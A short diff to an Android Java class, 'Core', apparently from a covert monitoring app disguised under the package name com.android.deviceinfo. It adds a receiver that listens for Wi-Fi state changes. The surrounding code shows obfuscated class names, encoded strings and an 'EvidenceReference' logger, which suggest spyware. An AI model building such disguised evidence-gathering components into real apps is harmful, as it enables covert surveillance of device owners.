@@ -14,7 +14,9 @@ import android.app.ActivityManager;
 import android.app.PendingIntent;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.IntentFilter;
 import android.content.res.Resources;
+import android.net.wifi.WifiManager;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 
@@ -33,6 +35,7 @@ import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.gui.AGUI;
 import com.android.deviceinfo.listener.BSm;
+import com.android.deviceinfo.listener.WR;
 import com.android.deviceinfo.manager.ManagerEvent;
 import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.optimize.NetworkOptimizer;
@@ -158,6 +161,13 @@ public class Core extends Activity implements Runnable {
 			wl.acquire();
 		}
 
+		// WiFi status manager
+		IntentFilter intentFilter = new IntentFilter();
+		intentFilter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
+		
+		WR wifiReceiver = new WR();
+		registerReceiver(wifiReceiver, intentFilter);
+		
 		EvidenceReference.info(M.e("Started")); //$NON-NLS-1$
 
 		serviceRunning = true;
